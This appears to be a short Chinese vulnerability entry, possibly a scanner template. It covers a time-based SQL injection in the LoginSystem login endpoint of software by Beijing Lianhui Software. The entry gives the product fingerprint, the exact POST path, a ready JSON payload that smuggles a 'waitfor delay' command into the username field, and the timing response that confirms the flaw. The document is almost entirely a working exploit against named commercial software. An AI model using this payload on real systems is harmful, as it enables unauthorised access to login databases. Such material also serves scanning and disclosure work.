# 北京联汇软件有限公司loginsystem存在sql注入漏洞

北京联汇软件有限公司 ｜ SQL注入 ｜ —
- **指纹**：`联汇软件`
- **请求**：`POST /UIServer/SystemLogin/Login.aspx/LoginSystem HTTP/1.1`

**Payload**
```
{"iuname":"6KmlkiRV'; waitfor delay '0:0:5' -- ","iupwd":"g00dPa$$w0rD"}
```
- **响应特征**：200 响应时间>=5s